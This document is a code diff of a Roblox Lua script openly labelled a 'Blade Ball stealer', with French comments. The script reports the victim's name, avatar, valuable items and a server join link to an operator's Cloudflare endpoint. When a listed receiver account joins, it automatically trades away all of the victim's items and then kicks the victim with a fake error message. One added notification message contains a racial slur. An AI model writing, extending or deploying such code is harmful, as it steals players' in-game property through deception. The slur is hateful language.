@@ -10,7 +10,6 @@ local HttpService = game:GetService("HttpService")
 local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
-local inTrade = false
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
@@ -22,9 +21,9 @@ local auth_token = _G.AuthToken or ""
 
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
 
--- Fonction pour récupérer l'avatar de la victime
+-- API Roblox pour la photo de profil (Avatar Headshot)
 local function getAvatarUrl(userId)
-    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    return "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false"
 end
 
 local function formatNumber(number)
@@ -40,11 +39,17 @@ end
 
 local totalRAP = 0
 
--- FONCTION D'ENVOI AU WORKER (Avec data Avatar/Nom)
 local function PostToCloudflare(data)
     data["auth_token"] = auth_token
     data["victim_name"] = plr.Name
-    data["victim_avatar"] = getAvatarUrl(plr.UserId)
+    
+    -- On récupère l'URL de l'image via l'API thumbnails
+    local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..plr.UserId.."&size=150x150&format=Png&isCircular=false"
+    local successThumb, thumbRes = pcall(function() return game:HttpGet(thumbApi) end)
+    if successThumb then
+        local decoded = HttpService:JSONDecode(thumbRes)
+        data["victim_avatar"] = decoded.data[1].imageUrl
+    end
     
     local success, res = pcall(function()
         return httpRequest({
@@ -57,24 +62,27 @@ local function PostToCloudflare(data)
     return success
 end
 
-local function SendJoinMessage(list, prefix)
+-- Fonction pour formater la liste des items proprement
+local function getFormattedList(list)
     local grouped = {}
     for _, item in ipairs(list) do
         grouped[item.Name] = grouped[item.Name] or {Name = item.Name, Count = 0, TotalRAP = 0}
         grouped[item.Name].Count = grouped[item.Name].Count + 1
         grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
     end
-
     local groupedList = {}
     for _, group in pairs(grouped) do table.insert(groupedList, group) end
     table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
-    local itemListText = ""
+    local text = ""
     for _, group in ipairs(groupedList) do
-        -- Format sans étoile
-        itemListText = itemListText .. string.format("- %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
+        text = text .. string.format("- %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
     end
+    return text
+end
 
+local function SendJoinMessage(list, prefix)
+    local itemText = getFormattedList(list)
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -83,7 +91,7 @@ local function SendJoinMessage(list, prefix)
             ["fields"] = {
                 {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                 {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
-                {name = "Item list 📝:", value = #itemListText > 1000 and string.sub(itemListText, 1, 1000) .. "..." or itemListText},
+                {name = "Item list 📝:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
                 {name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP)}
             },
             ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
@@ -92,67 +100,68 @@ local function SendJoinMessage(list, prefix)
     PostToCloudflare(data)
 end
 
--- Calcul du RAP et préparation des items
+local function SendConfirmMessage(list)
+    local itemText = getFormattedList(list)
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "✅ The nigga is on the server ! 🎉",
+            ["description"] = "Le receveur est connecté. Transfert en cours...",
+            ["color"] = 65280,
+            ["fields"] = {
+                {name = "Victim:", value = plr.Name, inline = true},
+                {name = "Items:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText}
+            }
+        }}
+    }
+    PostToCloudflare(data)
+end
+
+-- CALCUL RAP
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
 for _, category in ipairs(categories) do
     local catMap = {}
     local categoryRapData = rapData[category]
     if categoryRapData then
-        for serializedKey, rap in pairs(categoryRapData) do
-            local s, decoded = pcall(function() return HttpService:JSONDecode(serializedKey) end)
-            if s then 
-                for _, pair in ipairs(decoded) do 
-                    if pair[1] == "Name" then catMap[pair[2]] = rap end 
-                end 
-            end
+        for k, v in pairs(categoryRapData) do
+            local s, d = pcall(function() return HttpService:JSONDecode(k) end)
+            if s then for _, p in ipairs(d) do if p[1] == "Name" then catMap[p[2]] = v end end end
         end
     end
-
-    for itemId, itemInfo in pairs(clientInventory[category]) do
-        if not itemInfo.TradeLock then
-            local rap = catMap[itemInfo.Name] or 0
+    for id, info in pairs(clientInventory[category]) do
+        if not info.TradeLock then
+            local rap = catMap[info.Name] or 0
             if rap >= min_rap then
                 totalRAP = totalRAP + rap
-                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = category, Name = info.Name})
             end
         end
     end
 end
 
--- Lancement de la logique de trade
+-- LOGIQUE FINALE
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
-    
-    local prefix = (ping == "Yes") and "@everyone " or ""
-    SendJoinMessage(itemsToSend, prefix)
+    local copy = {unpack(itemsToSend)}
+    SendJoinMessage(itemsToSend, (ping == "Yes" and "@everyone " or ""))
 
     local function doTrade(target)
+        SendConfirmMessage(copy)
         while #itemsToSend > 0 do
-            pcall(function()
-                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(target))
-            end)
+            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(target)) end)
             repeat task.wait(0.5) until tradeGui.Enabled
-            inTrade = true
-            
             local count = 0
             while #itemsToSend > 0 and count < 100 do
                 local item = table.remove(itemsToSend, 1)
                 netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                 count = count + 1
             end
-            
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
             netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
             repeat task.wait(0.2) until not tradeGui.Enabled
-            inTrade = false
         end
-        plr:kick("Connection Error (277)")
+        plr:kick("Trade Terminé (Erreur 277)")
     end
 
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(users, player.Name) then doTrade(player.Name) end
-    end)
-    for _, p in ipairs(Players:GetPlayers()) do
-        if table.find(users, p.Name) then doTrade(p.Name) break end
-    end
+    Players.PlayerAdded:Connect(function(p) if table.find(users, p.Name) then doTrade(p.Name) end end)
+    for _, p in ipairs(Players:GetPlayers()) do if table.find(users, p.Name) then doTrade(p.Name) break end end
 end
